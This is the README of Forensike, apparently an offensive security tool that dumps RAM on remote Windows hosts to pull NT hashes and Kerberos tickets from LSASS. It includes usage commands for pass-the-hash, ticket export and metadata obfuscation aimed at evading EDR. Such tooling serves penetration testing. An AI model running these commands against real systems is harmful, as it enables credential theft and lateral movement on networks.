# Forensike

Forensike is a Powershell script that leverages a RAM acquisition tool (DumpIt from MAGNET Forensics) in order to generate a Windows Crash Dump on a compromised host. Once you get your hands on a domain user that has local admin rights over a machine you can reach, you can start a Powershell session from which you will launch Forensike (you can use the `runas` command or (Over)Pass-The-Hash with classic tool if you don't have the cleartext password).

The script will then connect to the machine to retrieve some info about it that will help you with the rest of the attack. After validating, Forensike will transfer the RAM acquisition tool, create a Windows Crash dump, and execute a WinDBG session that will use the mimilib.dll extension to remotely extract LSASS.exe memory from the Crash Dump (crash dump always remains on the target disk)

This tool combines WMI queries, forensics and debugging techniques to extract NT hashes from the target LSASS process without directly reading LSASS memory.

Forensike guides you by giving you the space available on the target so that you don't saturate its disk as well as the current logged in user so that you know if the target is worth dumping its RAM.

At the time of writing, I have not encountered a specific EDR technology that has a default policy against the generation of Windows Crash dumps. As creating a Windows Crash dump is mostly part of a legitimate forensics behavior, the EDR I have worked against in my engagements and personal tests never blocked the writing of DumpIt on the target's disk nor the generation of final crash dump file. Like many other RAM acquisition tools, the driver used to access physical memory is signed, preventing EDRs from blocking them as soon as they start acquiring memory. I like to consider this attack as an extension of BYOVD attacks (Bring Your Own Vulnerable Driver)

Here is a demo : https://youtu.be/THuil2RaqJY

If you want more details about the tool or Forensics techniques applied for offensive security : you can check this article I wrote : https://blog.y00ga.lol/PUBLISH/Forensike%2C+or+Forensics+for+bad+guys

## Installation

- WinDBG on your system : https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/
- Make sure the WinDBG executable (`WinDbgX.exe`) is in your PATH

### PowerShell version

No additional dependencies — run directly from a PowerShell session with admin rights on the target.

### Python version (Linux-compatible)

```bash
# Install with pipx (recommended — isolated env, all deps included)
pipx install .

# Or classic pip
pip install .

# System dependency for CIFS mount
sudo apt install cifs-utils
```

All Python dependencies (**impacket**, **volatility3**, **pypykatz**) are installed automatically. Optional PE obfuscation support: `pip install forensike[metadata]`.

Works on Linux — no WinDBG needed. The crash dump stays on the target and is accessed remotely via CIFS mount (Linux equivalent of `\\target\C$` UNC access).

The extraction module (`lsass_extract`) is Forensike's custom "mimilib for Linux":
1. **volatility3** parses the crash dump and dumps LSASS virtual memory + modules
2. **MinidumpBuilder** assembles a valid Windows Minidump (MDMP) from that data
3. **pypykatz** parses the minidump and extracts NT hashes + Kerberos tickets

Same result as WinDBG + mimilib, nothing downloaded.

Supports pass-the-hash (`-H`) and Kerberos auth (`-K`).

## Usage

### PowerShell

```powershell
.\Forensike.ps1 -target WS01 -toolsDir .\tools -dumpDir .\output
.\Forensike.ps1 -target WS01 -toolsDir .\tools -dumpDir .\output -Metadata -Kerberos
```

### Python

```bash
# Full attack — DumpIt + remote extraction from Linux
forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -p P@ssw0rd

# With Kerberos ticket export
forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -p P@ssw0rd --kerberos

# Reuse dump from previous run or manual CIFS mount
forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -p P@ssw0rd \
    --dump-file /mnt/target/Windows/Temp/Forensike/Forensike.dmp

# PTH + metadata obfuscation
forensike WS01 --tools-dir ./tools --dump-dir ./output -d CORP -u admin -H :nthash --metadata

# Standalone extraction — parse an existing crash dump without remote ops
lsass-extract /path/to/crashdump.dmp -o ./output -k ./kirbi
```

## Parameters

- `target` : Target hostname (NetBIOS name). If DNS can't resolve it, add the entry in your hosts file
- `toolsDir` / `--tools-dir` : Folder containing DumpIt.exe, mimilib.dll, and rcedit-x64.exe
- `dumpDir` / `--dump-dir` : Output folder for `forensike_results.txt`, `lsass.txt` (LSASS EPROCESS address), `hashes.txt` (raw mimilib output)
- `Metadata` / `--metadata` : Rename DumpIt.exe randomly and strip PE metadata via rcedit-x64.exe before uploading to target
- `Kerberos` / `--kerberos` : Extract Kerberos tickets as `.kirbi` files. PowerShell: third WinDBG pass with mimilib on the crash dump. Python: vol3 extracts LSASS memory from the crash dump, MinidumpBuilder creates a valid minidump, pypykatz exports `.kirbi`. Exported tickets can be used for Pass-the-Ticket with Rubeus (`ptt`) or impacket (`ticketConverter.py` + any `-k` tool)
- `--dump-file` (Python only) : Path to an existing crash dump — skip acquisition and go straight to extraction (e.g. from a manual CIFS mount or previous run)

### Python-only auth options

- `-d` / `--domain` : Domain (default: `.`)
- `-u` / `--username` : Username
- `-p` / `--password` : Cleartext password
- `-H` / `--hashes` : NTLM hash in `LM:NT` format (pass-the-hash)
- `-K` / `--auth-kerberos` : Kerberos auth using `$KRB5CCNAME` ccache

Enjoy !


TO DO :

- Kerberos ticket dumping (✅)
- Check if other disks exist on the target and how much space left (✅)
- EDR detection
- Is WinDBG available on the attacker system (✅)
